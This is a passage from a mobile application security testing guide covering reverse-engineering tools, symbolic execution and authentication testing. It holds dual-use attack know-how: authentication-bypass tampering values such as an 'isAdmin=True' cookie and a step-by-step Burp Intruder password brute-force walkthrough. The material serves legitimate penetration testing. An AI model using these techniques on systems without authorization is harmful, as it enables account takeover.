of the function selected for disassembly. The \textbf{Display Function
Graph} option shows control flow graph of the selected function.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/7565cd5bcb1af1b7f77b1001570b2035da0e0358.png}
\caption{Ghidra Function Graph View}
\end{figure}

There are many other functionalities available in Ghidra and most of
them can be explored by opening the \textbf{Window} menu. For example,
if you want to examine the strings present in the binary, open the
\textbf{Defined Strings} option. We will discuss other advanced
functionalities while analyzing various binaries for Android and iOS
platforms in the coming chapters.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/54f39a0e594a78d2ceefec1465e3e353b39e1f8e.png}
\caption{Ghidra strings window}
\end{figure}

\hypertarget{debugging-and-tracing}{%
\paragraph{Debugging and Tracing}\label{debugging-and-tracing}}

In the traditional sense, debugging is the process of identifying and
isolating problems in a program as part of the software development life
cycle. The same tools used for debugging are valuable to reverse
engineers even when identifying bugs is not the primary goal. Debuggers
enable program suspension at any point during runtime, inspection of the
process' internal state, and even register and memory modification.
These abilities simplify program inspection.

\emph{Debugging} usually means interactive debugging sessions in which a
debugger is attached to the running process. In contrast, \emph{tracing}
refers to passive logging of information about the app's execution (such
as API calls). Tracing can be done in several ways, including debugging
APIs, function hooks, and Kernel tracing facilities. Again, we'll cover
many of these techniques in the OS-specific ``Reverse Engineering and
Tampering'' chapters.

\hypertarget{advanced-techniques}{%
\subsubsection{Advanced Techniques}\label{advanced-techniques}}

For more complicated tasks, such as de-obfuscating heavily obfuscated
binaries, you won't get far without automating certain parts of the
analysis. For example, understanding and simplifying a complex control
flow graph based on manual analysis in the disassembler would take you
years (and most likely drive you mad long before you're done). Instead,
you can augment your workflow with custom made tools. Fortunately,
modern disassemblers come with scripting and extension APIs, and many
useful extensions are available for popular disassemblers. There are
also open source disassembling engines and binary analysis frameworks.

As always in hacking, the anything-goes rule applies: simply use
whatever is most efficient. Every binary is different, and all reverse
engineers have their own style. Often, the best way to achieve your goal
is to combine approaches (such as emulator-based tracing and symbolic
execution). To get started, pick a good disassembler and/or reverse
engineering framework, then get comfortable with their particular
features and extension APIs. Ultimately, the best way to get better is
to get hands-on experience.

\hypertarget{dynamic-binary-instrumentation}{%
\paragraph{Dynamic Binary
Instrumentation}\label{dynamic-binary-instrumentation}}

Another useful approach for native binaries is dynamic binary
instrumentations (DBI). Instrumentation frameworks such as Valgrind and
PIN support fine-grained instruction-level tracing of single processes.
This is accomplished by inserting dynamically generated code at runtime.
Valgrind compiles fine on Android, and pre-built binaries are available
for download.

The
\href{http://valgrind.org/docs/manual/dist.readme-android.html}{Valgrind
README} includes specific compilation instructions for Android.

\hypertarget{emulation-based-dynamic-analysis}{%
\paragraph{Emulation-based Dynamic
Analysis}\label{emulation-based-dynamic-analysis}}

Emulation is an imitation of a certain computer platform or program
being executed in different platform or within another program. The
software or hardware performing this imitation is called an
\emph{emulator}. Emulators provide a much cheaper alternative to an
actual device, where a user can manipulate it without worrying about
damaging the device. There are multiple emulators available for Android,
but for iOS there are practically no viable emulators available. iOS
only has a simulator, shipped within Xcode.

The difference between a simulator and an emulator often causes
confusion and leads to use of the two terms interchangeably, but in
reality they are different, specially for the iOS use case. An emulator
mimics both the software and hardware environment of a targeted
platform. On the other hand, a simulator only mimics the software
environment.

QEMU based emulators for Android take into consideration the RAM, CPU,
battery performance etc (hardware components) while running an
application, but in an iOS simulator this hardware component behaviour
is not taken into consideration at all. The iOS simulator even lacks the
implementation of the iOS kernel, as a result if an application is using
syscalls it cannot be executed in this simulator.

In simple words, an emulator is a much closer imitation of the targeted
platform, while a simulator mimics only a part of it.

Running an app in the emulator gives you powerful ways to monitor and
manipulate its environment. For some reverse engineering tasks,
especially those that require low-level instruction tracing, emulation
is the best (or only) choice. Unfortunately, this type of analysis is
only viable for Android, because no free or open source emulator exists
for iOS (the iOS simulator is not an emulator, and apps compiled for an
iOS device don't run on it). The only iOS emulator available is a
commercial SaaS solution - Corellium. We'll provide an overview of
popular emulation-based analysis frameworks for Android in the
``Tampering and Reverse Engineering on Android'' chapter.

\hypertarget{custom-tooling-with-reverse-engineering-frameworks}{%
\paragraph{Custom Tooling with Reverse Engineering
Frameworks}\label{custom-tooling-with-reverse-engineering-frameworks}}

Even though most professional GUI-based disassemblers feature scripting
facilities and extensibility, they are simply not well-suited to solving
particular problems. Reverse engineering frameworks allow you to perform
and automate any kind of reversing task without depending on a
heavy-weight GUI. Notably, most reversing frameworks are open source
and/or available for free. Popular frameworks with support for mobile
architectures include \href{https://github.com/radare/radare2}{Radare2}
and \href{https://github.com/angr/angr}{Angr}.

\hypertarget{example-program-analysis-with-symbolicconcolic-execution}{%
\subparagraph{Example: Program Analysis with Symbolic/Concolic
Execution}\label{example-program-analysis-with-symbolicconcolic-execution}}

In the late 2000s, testing based on symbolic execution has become a
popular way to identify security vulnerabilities. Symbolic ``execution''
actually refers to the process of representing possible paths through a
program as formulas in first-order logic. Satisfiability Modulo Theories
(SMT) solvers are used to check the satisfiability of these formulas and
provide solutions, including concrete values of the variables needed to
reach a certain point of execution on the path corresponding to the
solved formula.

In simple words, symbolic execution is mathematically analyzing a
program without executing it. During analysis, each unknown input is
represented as a mathematical variable (a symbolic value), and hence all
the operations performed on these variables are recorded as a tree of
operations (aka. AST (abstract syntax tree), from compiler theory).
These ASTs can be translated into so-called \emph{constraints} that will
be interpreted by a SMT solver. In the end of this analysis, a final
mathematical equation is obtained, in which the variables are the inputs
whose values are not known. SMT solvers are special programs which solve
these equations to give possible values for the input variables given a
final state.

To illustrate this, imagine a function which takes one input
(\texttt{x}) and multiplies it by the value of a second input
(\texttt{y}). Finally, there is an \emph{if} condition which checks if
the value calculated is greater than the value of an external
variable(\texttt{z}), and returns ``success'' if true, else returns
``fail''. The equation for this operation will be
\texttt{(x\ *\ y)\ \textgreater{}\ z}.

If we want the function to always return ``success'' (final state), we
can tell the SMT solver to calculate the values for \texttt{x} and
\texttt{y} (input variables) which satisfy the corresponding equation.
As is the case for global variables, their value can be changed from
outside this function, which may lead to different outputs whenever this
function is executed. This adds to additional complexity in determining
correct solution.

Internally SMT solvers use various equation solving techniques to
generate solution for such equations. Some of the techniques are very
advanced and their discussion is beyond the scope of this book.

In a real world situation, the functions are much more complex than the
above example. The increased complexity of the functions can pose
significant challenges for classical symbolic execution. Some of the
challenges are summarised below:

\begin{itemize}
\tightlist
\item
  Loops and recursions in a program may lead to \emph{infinite execution
  tree}.
\item
  Multiple conditional branches or nested conditions may lead to
  \emph{path explosion}.
\item
  Complex equations generated by symbolic execution may not be solvable
  by SMT solvers because of their limitations.
\item
  Program is using system calls, library calls or network events which
  cannot be handled by symbolic execution.
\end{itemize}

To overcome these challenges, typically, symbolic execution is combined
with other techniques such as \emph{dynamic execution} (also called
\emph{concrete execution}) to mitigate the path explosion problem
specific to classical symbolic execution. This combination of concrete
(actual) and symbolic execution is referred to as \emph{concolic
execution}~(the name concolic stems from \textbf{conc}rete and
symb\textbf{olic}), sometimes also called as \emph{dynamic symbolic
execution}.

To visualize this, in the above example, we can obtain the value of the
external variable by performing further reverse engineering or by
dynamically executing the program and feeding this information into our
symbolic execution analysis. This extra information will reduce the
complexity of our equations and may produce more accurate analysis
results. Together with improved SMT solvers and current hardware speeds,
concolic execution allows to explore paths in medium-size software
modules (i.e., on the order of 10 KLOC).

In addition, symbolic execution also comes in handy for supporting
de-obfuscation tasks, such as simplifying control flow graphs. For
example, Jonathan Salwan and Romain Thomas have
\href{https://triton.quarkslab.com/files/csaw2016-sos-rthomas-jsalwan.pdf}{shown
how to reverse engineer VM-based software protections using Dynamic
Symbolic Execution} {[}\#salwan{]} (i.e., using a mix of actual
execution traces, simulation, and symbolic execution).

In the Android section, you'll find a walkthrough for cracking a simple
license check in an Android application using symbolic execution.

\hypertarget{references-1}{%
\subsubsection{References}\label{references-1}}

\begin{itemize}
\tightlist
\item
  {[}\#vadla{]} Ole André Vadla Ravnås, Anatomy of a code tracer -
  \url{https://medium.com/@oleavr/anatomy-of-a-code-tracer-b081aadb0df8}
\item
  {[}\#salwan{]} Jonathan Salwan and Romain Thomas, How Triton can help
  to reverse virtual machine based software protections -
  \url{https://triton.quarkslab.com/files/csaw2016-sos-rthomas-jsalwan.pdf}
\end{itemize}

\hypertarget{tools}{%
\paragraph{Tools}\label{tools}}

\begin{itemize}
\tightlist
\item
  Angr - \url{https://github.com/angr/angr}
\item
  Cycript - \url{http://www.cycript.org/}
\item
  Frida - \url{https://www.frida.re/}
\item
  Frida CLI - \url{https://www.frida.re/docs/frida-cli/}
\item
  frida-ls-devices - \url{https://www.frida.re/docs/frida-ls-devices/}
\item
  frida-ps - \url{https://www.frida.re/docs/frida-ps/}
\item
  frida-trace - \url{https://www.frida.re/docs/frida-trace/}
\item
  Fridump - \url{https://github.com/Nightbringer21/fridump}
\item
  Objection - \url{https://github.com/sensepost/objection}
\item
  Passionfruit - \url{https://github.com/chaitin/passionfruit}
\item
  Ghidra - \url{https://github.com/NationalSecurityAgency/ghidra}
\item
  Radare2 - \url{https://github.com/radare/radare2}
\item
  r2frida - \url{https://github.com/nowsecure/r2frida}
\item
  Substrate - \url{http://www.cydiasubstrate.com/}
\item
  Xposed - \url{https://www.xda-developers.com/xposed-framework-hub/}
\end{itemize}

\hypertarget{mobile-app-authentication-architectures}{%
\subsection{Mobile App Authentication
Architectures}\label{mobile-app-authentication-architectures}}

Authentication and authorization problems are prevalent security
vulnerabilities. In fact, they consistently rank second highest in the
\href{https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project}{OWASP
Top 10}.

Most mobile apps implement some kind of user authentication. Even though
part of the authentication and state management logic is performed by
the backend service, authentication is such an integral part of most
mobile app architectures that understanding its common implementations
is important.

Since the basic concepts are identical on iOS and Android, we'll discuss
prevalent authentication and authorization architectures and pitfalls in
this generic guide. OS-specific authentication issues, such as local and
biometric authentication, will be discussed in the respective
OS-specific chapters.

\hypertarget{general-guidelines-on-testing-authentication}{%
\subsubsection{General Guidelines on Testing
Authentication}\label{general-guidelines-on-testing-authentication}}

There's no one-size-fits-all approach to authentication. When reviewing
the authentication architecture of an app, you should first consider
whether the authentication method(s) used are appropriate in the given
context. Authentication can be based on one or more of the following:

\begin{itemize}
\tightlist
\item
  Something the user knows (password, PIN, pattern, etc.)
\item
  Something the user has (SIM card, one-time password generator, or
  hardware token)
\item
  A biometric property of the user (fingerprint, retina, voice)
\end{itemize}

The number of authentication procedures implemented by mobile apps
depends on the sensitivity of the functions or accessed resources. Refer
to industry best practices when reviewing authentication functions.
Username/password authentication (combined with a reasonable password
policy) is generally considered sufficient for apps that have a user
login and aren't very sensitive. This form of authentication is used by
most social media apps.

For sensitive apps, adding a second authentication factor is usually
appropriate. This includes apps that provide access to very sensitive
information (such as credit card numbers) or allow users to transfer
funds. In some industries, these apps must also comply with certain
standards. For example, financial apps have to ensure compliance with
the Payment Card Industry Data Security Standard (PCI DSS), the Gramm
Leach Bliley Act, and the Sarbanes-Oxley Act (SOX). Compliance
considerations for the US health care sector include the Health
Insurance Portability and Accountability Act (HIPAA) and the Patient
Safety Rule.

You can also use the
\href{https://github.com/OWASP/owasp-masvs/blob/master/Document/0x09-V4-Authentication_and_Session_Management_Requirements.md}{OWASP
Mobile AppSec Verification Standard} as a guideline. For non-critical
apps (``Level 1''), the MASVS lists the following authentication
requirements:

\begin{itemize}
\tightlist
\item
  If the app provides users with access to a remote service, an
  acceptable form of authentication such as username/password
  authentication is performed at the remote endpoint.
\item
  A password policy exists and is enforced at the remote endpoint.
\item
  The remote endpoint implements an exponential back-off, or temporarily
  locks the user account, when incorrect authentication credentials are
  submitted an excessive number of times.
\end{itemize}

For sensitive apps (``Level 2''), the MASVS adds the following:

\begin{itemize}
\tightlist
\item
  A second factor of authentication exists at the remote endpoint and
  the 2FA requirement is consistently enforced.
\item
  Step-up authentication is required to enable actions that deal with
  sensitive data or transactions.
\item
  The app informs the user of the recent activities with their account
  when they log in.
\end{itemize}

You can find details on how to test for the requirements above in the
following sections.

\hypertarget{stateful-vs.-stateless-authentication}{%
\paragraph{Stateful vs.~Stateless
Authentication}\label{stateful-vs.-stateless-authentication}}

You'll usually find that the mobile app uses HTTP as the transport
layer. The HTTP protocol itself is stateless, so there must be a way to
associate a user's subsequent HTTP requests with that user---otherwise,
the user's log in credentials would have to be sent with every request.
Also, both the server and client need to keep track of user data (e.g.,
the user's privileges or role). This can be done in two different ways:

\begin{itemize}
\item
  With \emph{stateful} authentication, a unique session id is generated
  when the user logs in. In subsequent requests, this session ID serves
  as a reference to the user details stored on the server. The session
  ID is \emph{opaque}; it doesn't contain any user data.
\item
  With \emph{stateless} authentication, all user-identifying information
  is stored in a client-side token. The token can be passed to any
  server or micro service, eliminating the need to maintain session
  state on the server. Stateless authentication is often factored out to
  an authorization server, which produces, signs, and optionally
  encrypts the token upon user login.
\end{itemize}

Web applications commonly use stateful authentication with a random
session ID that is stored in a client-side cookie. Although mobile apps
sometimes use stateful sessions in a similar fashion, stateless
token-based approaches are becoming popular for a variety of reasons:

\begin{itemize}
\tightlist
\item
  They improve scalability and performance by eliminating the need to
  store session state on the server.
\item
  Tokens enable developers to decouple authentication from the app.
  Tokens can be generated by an authentication server, and the
  authentication scheme can be changed seamlessly.
\end{itemize}

As a mobile security tester, you should be familiar with both types of
authentication.

\hypertarget{supplementary-authentication}{%
\paragraph{Supplementary
Authentication}\label{supplementary-authentication}}

Authentication schemes are sometimes supplemented by
\href{https://pdfs.semanticscholar.org/13aa/7bf53070ac8e209a84f6389bab58a1e2c888.pdf}{passive
contextual authentication}, which can incorporate:

\begin{itemize}
\tightlist
\item
  Geolocation
\item
  IP address
\item
  Time of day
\item
  The device being used
\end{itemize}

Ideally, in such a system the user's context is compared to previously
recorded data to identify anomalies that might indicate account abuse or
potential fraud. This process is transparent to the user, but can become
a powerful deterrent to attackers.

\hypertarget{verifying-that-appropriate-authentication-is-in-place-mstg-arch-2-and-mstg-auth-1}{%
\subsubsection{Verifying that Appropriate Authentication is in Place
(MSTG-ARCH-2 and
MSTG-AUTH-1)}\label{verifying-that-appropriate-authentication-is-in-place-mstg-arch-2-and-mstg-auth-1}}

Perform the following steps when testing authentication and
authorization:

\begin{itemize}
\tightlist
\item
  Identify the additional authentication factors the app uses.
\item
  Locate all endpoints that provide critical functionality.
\item
  Verify that the additional factors are strictly enforced on all
  server-side endpoints.
\end{itemize}

Authentication bypass vulnerabilities exist when authentication state is
not consistently enforced on the server and when the client can tamper
with the state. While the backend service is processing requests from
the mobile client, it must consistently enforce authorization checks:
verifying that the user is logged in and authorized every time a
resource is requested.

Consider the following example from the
\href{https://www.owasp.org/index.php/Testing_for_Bypassing_Authentication_Schema_\%28OTG-AUTHN-004\%29}{OWASP
Web Testing Guide}. In the example, a web resource is accessed through a
URL, and the authentication state is passed through a GET parameter:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{http://www.site.com/page.asp?authenticated=no}
\end{Highlighting}
\end{Shaded}

The client can arbitrarily change the GET parameters sent with the
request. Nothing prevents the client from simply changing the value of
the \texttt{authenticated} parameter to ``yes'', effectively bypassing
authentication.

Although this is a simplistic example that you probably won't find in
the wild, programmers sometimes rely on ``hidden'' client-side
parameters, such as cookies, to maintain authentication state. They
assume that these parameters can't be tampered with. Consider, for
example, the following
\href{http://seclists.org/bugtraq/2009/May/251}{classic vulnerability in
Nortel Contact Center Manager}. The administrative web application of
Nortel's appliance relied on the cookie ``isAdmin'' to determine whether
the logged-in user should be granted administrative privileges.
Consequently, it was possible to get admin access by simply setting the
cookie value as follows:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{isAdmin=True}
\end{Highlighting}
\end{Shaded}

Security experts used to recommend using session-based authentication
and maintaining session data on the server only. This prevents any form
of client-side tampering with the session state. However, the whole
point of using stateless authentication instead of session-based
authentication is to \emph{not} have session state on the server.
Instead, state is stored in client-side tokens and transmitted with
every request. In this case, seeing client-side parameters such as
\texttt{isAdmin} is perfectly normal.

To prevent tampering cryptographic signatures are added to client-side
tokens. Of course, things may go wrong, and popular implementations of
stateless authentication have been vulnerable to attacks. For example,
the signature verification of some JSON Web Token (JWT) implementations
could be deactivated by
\href{https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/}{setting
the signature type to ``None''}. We'll discuss this attack in more
detail in the ``Testing JSON Web Tokens'' chapter.

\hypertarget{testing-best-practices-for-passwords-mstg-auth-5-and-mstg-auth-6}{%
\subsubsection{Testing Best Practices for Passwords (MSTG-AUTH-5 and
MSTG-AUTH-6)}\label{testing-best-practices-for-passwords-mstg-auth-5-and-mstg-auth-6}}

Password strength is a key concern when passwords are used for
authentication. The password policy defines requirements to which end
users should adhere. A password policy typically specifies password
length, password complexity, and password topologies. A ``strong''
password policy makes manual or automated password cracking difficult or
impossible. The following sections will cover various areas regarding
password best practices. For further information please consult the
\href{https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Authentication_Cheat_Sheet.md\#implement-proper-password-strength-controls}{OWASP
Authentication Cheat Sheet}.

\hypertarget{static-analysis-1}{%
\paragraph{Static Analysis}\label{static-analysis-1}}

Confirm the existence of a password policy and verify the implemented
password complexity requirements according to the
\href{https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Authentication_Cheat_Sheet.md\#implement-proper-password-strength-controls}{OWASP
Authentication Cheat Sheet} which focuses on length and an unlimited
character set. Identify all password-related functions in the source
code and make sure that a verification check is performed in each of
them. Review the password verification function and make sure that it
rejects passwords that violate the password policy.

\hypertarget{zxcvbn}{%
\subparagraph{zxcvbn}\label{zxcvbn}}

\href{https://github.com/dropbox/zxcvbn}{zxcvbn} is a common library
that can be used for estimating password strength, inspired by password
crackers. It is available in JavaScript but also for many other
programming languages on the server side. There are different methods of
installation, please check the Github repo for your preferred method.
Once installed, zxcvbn can be used to calculate the complexity and the
amount of guesses to crack the password.

After adding the zxcvbn JavaScript library to the HTML page, you can
execute the command \texttt{zxcvbn} in the browser console, to get back
detailed information about how likely it is to crack the password
including a score.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/5adbeedbb4e9578327329ff2b30517e548450d8e.png}
\caption{An example of a zxcvbn score}
\end{figure}

The score is defined as follows and can be used for a password strength
bar for example:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{0 \# too guessable: risky password. (guesses }\ErrorTok{<}\NormalTok{ 10\^{}3)}

\NormalTok{1 \# very guessable: protection from throttled online attacks. (guesses }\ErrorTok{<}\NormalTok{ 10\^{}6)}

\NormalTok{2 \# somewhat guessable: protection from unthrottled online attacks. (guesses }\ErrorTok{<}\NormalTok{ 10\^{}8)}

\NormalTok{3 \# safely unguessable: moderate protection from offline slow{-}hash scenario. (guesses }\ErrorTok{<}\NormalTok{ 10\^{}10)}

\NormalTok{4 \# very unguessable: strong protection from offline slow{-}hash scenario. (guesses >= 10\^{}10)}
\end{Highlighting}
\end{Shaded}

Note that zxcvbn can be implemented by the app-developer as well using
the Java (or other) implementation in order to guide the user into
creating a strong password.

\hypertarget{have-i-been-pwned-pwnedpasswords}{%
\paragraph{Have I Been Pwned:
PwnedPasswords}\label{have-i-been-pwned-pwnedpasswords}}

In order to further reduce the likelihood of a successful dictionary
attack against a single factor authentication scheme (e.g.~password
only), you can verify whether a password has been compromised in a data
breach. This can be done using services based on the Pwned Passwords API
by Troy Hunt (available at api.pwnedpasswords.com). For example, the
``\href{https://haveibeenpwned.com}{Have I been pwned?}'' companion
website. Based on the SHA-1 hash of a possible password candidate, the
API returns the number of times the hash of the given password has been
found in the various breaches collected by the service. The workflow
takes the following steps:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Encode the user input to UTF-8 (e.g.: the password \texttt{test}).
\item
  Take the SHA-1 hash of the result of step 1 (e.g.: the hash of
  \texttt{test} is \texttt{A94A8FE5CCB19BA61C4C0873D391E987982FBBD3}).
\item
  Copy the first 5 characters (the hash prefix) and use them for a
  range-search:
  \texttt{http\ GET\ https://api.pwnedpasswords.com/range/A94A8}
\item
  Iterate through the result and look for the rest of the hash (e.g.~is
  \texttt{FE5CCB19BA61C4C0873D391E987982FBBD3} part of the returned
  list?). If it is not part of the returned list, then the password for
  the given hash has not been found. Otherwise, as in case of
  \texttt{FE5CCB19BA61C4C0873D391E987982FBBD3}, it will return a counter
  showing how many times it has been found in breaches (e.g.:
  \texttt{FE5CCB19BA61C4C0873D391E987982FBBD3:76479}).
\end{enumerate}

Further documentation on the Pwned Passwords API can be found
\href{https://haveibeenpwned.com/API/v3}{online}.

Note that this API is best used by the app-developer when the user needs
to register and enter a password to check whether it is a recommended
password or not.

\hypertarget{login-throttling}{%
\subparagraph{Login Throttling}\label{login-throttling}}

Check the source code for a throttling procedure: a counter for logins
attempted in a short period of time with a given user name and a method
to prevent login attempts after the maximum number of attempts has been
reached. After an authorized login attempt, the error counter should be
reset.

Observe the following best practices when implementing anti-brute-force
controls:

\begin{itemize}
\tightlist
\item
  After a few unsuccessful login attempts, targeted accounts should be
  locked (temporarily or permanently), and additional login attempts
  should be rejected.
\item
  A five-minute account lock is commonly used for temporary account
  locking.
\item
  The controls must be implemented on the server because client-side
  controls are easily bypassed.
\item
  Unauthorized login attempts must be tallied with respect to the
  targeted account, not a particular session.
\end{itemize}

Additional brute force mitigation techniques are described on the OWASP
page
\href{https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks}{Blocking
Brute Force Attacks}.

\hypertarget{dynamic-testing-mstg-auth-6}{%
\paragraph{Dynamic Testing
(MSTG-AUTH-6)}\label{dynamic-testing-mstg-auth-6}}

Automated password guessing attacks can be performed using a number of
tools. For HTTP(S) services, using an interception proxy is a viable
option. For example, you can use
\href{https://portswigger.net/burp/help/intruder_using.html}{Burp Suite
Intruder} to perform both wordlist-based and brute-force attacks.

\begin{quote}
Please keep in mind that the Burp Suite Community Edition has
significant limitations apart from not being able to save projects. For
example, a throttling mechanism will be activated after several requests
that will slow down your attacks with Burp Intruder dramatically. Also
no built-in password lists are available in this version. If you want to
execute a real brute force attack use either Burp Suite Professional or
OWASP ZAP.
\end{quote}

Execute the following steps for a wordlist based brute force attack with
Burp Intruder:

\begin{itemize}
\tightlist
\item
  Start Burp Suite Professional.
\item
  Create a new project (or open an existing one).
\item
  Set up your mobile device to use Burp as the HTTP/HTTPS proxy. Log
  into the mobile app and intercept the authentication request sent to
  the backend service.
\item
  Right-click this request on the \textbf{Proxy/HTTP History} tab and
  select \textbf{Send to Intruder} in the context menu.
\item
  Select the \textbf{Intruder} tab. For further information on how to
  use
  \href{https://portswigger.net/burp/documentation/desktop/tools/intruder/using}{Burp
  Intruder} read the official documentation on Portswigger.
\item
  Make sure all parameters in the \textbf{Target}, \textbf{Positions},
  and \textbf{Options} tabs are appropriately set and select the
  \textbf{Payload} tab.
\item
  Load or paste the list of passwords you want to try. There are several
  resources available that offer password lists, like
  \href{https://github.com/fuzzdb-project/fuzzdb/}{FuzzDB}, the built-in
  lists in Burp Intruder or the files available in
  \texttt{/usr/share/wordlists} on Kali Linux.
\end{itemize}

Once everything is configured and you have a word-list selected, you're
ready to start the attack!

\begin{figure}
\centering
\includegraphics[width=4.6875in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/ef35163475f90699bc1e3dc9c0670e1dcb0a0f68.png}
\caption{List of passwords in Burp Suite}
\end{figure}

\begin{itemize}
\tightlist
\item
  Click the \textbf{Start attack} button to attack the authentication.
\end{itemize}

A new window will open. Site requests are sent sequentially, each
request corresponding to a password from the list. Information about the
response (length, status code, etc.) is provided for each request,
allowing you to distinguish successful and unsuccessful attempts:

\begin{figure}
\centering
\includegraphics[width=4.6875in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/6b817d1ce3fb5ecf5ff181554fb12a94aaec6e01.png}
\caption{A successful attack in Burp Suite}
\end{figure}

In this example, you can identify the successful attempt according to
the different length and the HTTP status code, which reveals the
password 12345.

To test if your own test accounts are prone to brute forcing, append the
correct password of your test account to the end of the password list.
The list shouldn't have more than 25 passwords. If you can complete the
attack without permanently or temporarily locking the account or solving
a CAPTCHA after a certain amount of requests with wrong passwords, that
means the account isn't protected against brute force attacks.

\begin{quote}
Tip: Perform these kinds of tests only at the very end of your
penetration test. You don't want to lock out your account on the first
day of testing and potentially having to wait for it to be unlocked. For
some projects unlocking accounts might be more difficult than you think.
\end{quote}

\hypertarget{testing-stateful-session-management-mstg-auth-2}{%
\subsubsection{Testing Stateful Session Management
(MSTG-AUTH-2)}\label{testing-stateful-session-management-mstg-auth-2}}

Stateful (or ``session-based'') authentication is characterized by
authentication records on both the client and server. The authentication
flow is as follows:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  The app sends a request with the user's credentials to the backend
  server.
\item
  The server verifies the credentials If the credentials are valid, the
  server creates a new session along with a random session ID.
\item
  The server sends to the client a response that includes the session
  ID.
\item
  The client sends the session ID with all subsequent requests. The
  server validates the session ID and retrieves the associated session
  record.
\item
  After the user logs out, the server-side session record is destroyed
  and the client discards the session ID.
\end{enumerate}

When sessions are improperly managed, they are vulnerable to a variety
of attacks that may compromise the session of a legitimate user,
allowing the attacker to impersonate the user. This may result in lost
data, compromised confidentiality, and illegitimate actions.

\hypertarget{session-management-best-practices}{%
\paragraph{Session Management Best
Practices}\label{session-management-best-practices}}

Locate any server-side endpoints that provide sensitive information or
functions and verify the consistent enforcement of authorization. The
backend service must verify the user's session ID or token and make sure
that the user has sufficient privileges to access the resource. If the
session ID or token is missing or invalid, the request must be rejected.

Make sure that:

\begin{itemize}
\tightlist
\item
  Session IDs are randomly generated on the server side.
\item
  The IDs can't be guessed easily (use proper length and entropy).
\item
  Session IDs are always exchanged over secure connections (e.g.~HTTPS).
\item
  The mobile app doesn't save session IDs in permanent storage.
\item
  The server verifies the session whenever a user tries to access
  privileged application elements, (a session ID must be valid and must
  correspond to the proper authorization level).
\item
  The session is terminated on the server side and session information
  deleted within the mobile app after it times out or the user logs out.
\end{itemize}

Authentication shouldn't be implemented from scratch but built on top of
proven frameworks. Many popular frameworks provide ready-made
authentication and session management functionality. If the app uses
framework APIs for authentication, check the framework security
documentation for best practices. Security guides for common frameworks
are available at the following links:

\begin{itemize}
\tightlist
\item
  \href{https://projects.spring.io/spring-security}{Spring (Java)}
\item
  \href{https://struts.apache.org/security/}{Struts (Java)}
\item
  \href{https://laravel.com/docs/5.4/authentication}{Laravel (PHP)}
\item
  \href{https://guides.rubyonrails.org/security.html}{Ruby on Rails}
\end{itemize}

A great resource for testing server-side authentication is the OWASP Web
Testing Guide, specifically the
\href{https://www.owasp.org/index.php/Testing_for_authentication}{Testing
Authentication} and
\href{https://www.owasp.org/index.php/Testing_for_Session_Management}{Testing
Session Management} chapters.

\hypertarget{testing-session-timeout-mstg-auth-7}{%
\subsubsection{Testing Session Timeout
(MSTG-AUTH-7)}\label{testing-session-timeout-mstg-auth-7}}

Minimizing the lifetime of session identifiers and tokens decreases the
likelihood of successful account hijacking.

\hypertarget{static-analysis-2}{%
\paragraph{Static Analysis}\label{static-analysis-2}}

In most popular frameworks, you can set the session timeout via
configuration options. This parameter should be set according to the
best practices specified in the framework documentation. The recommended
timeout may be between 10 minutes and two hours, depending on the app's
sensitivity. Refer to the framework documentation for examples of
session timeout configuration:

\begin{itemize}
\tightlist
\item
  \href{https://docs.spring.io/spring-session/docs/current/reference/html5/}{Spring
  (Java)}
\item
  \href{https://guides.rubyonrails.org/security.html\#session-expiry}{Ruby
  on Rails}
\item
  \href{https://php.net/manual/en/session.configuration.php\#ini.session.gc-maxlifetime}{PHP}
\item
  \href{https://goo.gl/qToQuL}{ASP.Net}
\end{itemize}

\hypertarget{dynamic-analysis-1}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-1}}

To verify if a session timeout is implemented, proxy your requests
through an interception proxy and perform the following steps:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Log in to the application.
\item
  Access a resource that requires authentication, typically a request
  for private information belonging to your account.
\item
  Try to access the data after an increasing number of 5-minute delays
  has passed (5, 10, 15, \ldots).
\item
  Once the resource is no longer available, you will know the session
  timeout.
\end{enumerate}

After you have identified the session timeout, verify whether it has an
appropriate length for the application. If the timeout is too long, or
if the timeout does not exist, this test case fails.

\begin{quote}
When using Burp Proxy, you can use the
\href{https://portswigger.net/bappstore/c4bfd29882974712a1d69c6d8f05874e}{Session
Timeout Test extension} to automate this test.
\end{quote}

\hypertarget{testing-user-logout-mstg-auth-4}{%
\subsubsection{Testing User Logout
(MSTG-AUTH-4)}\label{testing-user-logout-mstg-auth-4}}

The purpose of this test case is verifying logout functionality and
determining whether it effectively terminates the session on both client
and server and invalidates a stateless token.

Failing to destroy the server-side session is one of the most common
logout functionality implementation errors. This error keeps the session
or token alive, even after the user logs out of the application. An
attacker who gets valid authentication information can continue to use
it and hijack a user's account.

Many mobile apps don't automatically log users out. There can be various
reasons, such as: because it is inconvenient for customers, or because
of decisions made when implementing stateless authentication. The
application should still have a logout function, and it should be
implemented according to best practices, destroying all locally stored
tokens or session identifiers. If session information is stored on the
server, it should also be destroyed by sending a logout request to that
server. In case of a high-risk application, tokens should be
blacklisted. Not removing tokens or session identifiers can result in
unauthorized access to the application in case the tokens are leaked.
Note that other sensitive types of information should be removed as
well, as any information that is not properly cleared may be leaked
later, for example during a device backup.

\hypertarget{static-analysis-3}{%
\paragraph{Static Analysis}\label{static-analysis-3}}

If server code is available, make sure logout functionality terminates
the session correctly. This verification will depend on the technology.
Here are different examples of session termination for proper
server-side logout:

\begin{itemize}
\tightlist
\item
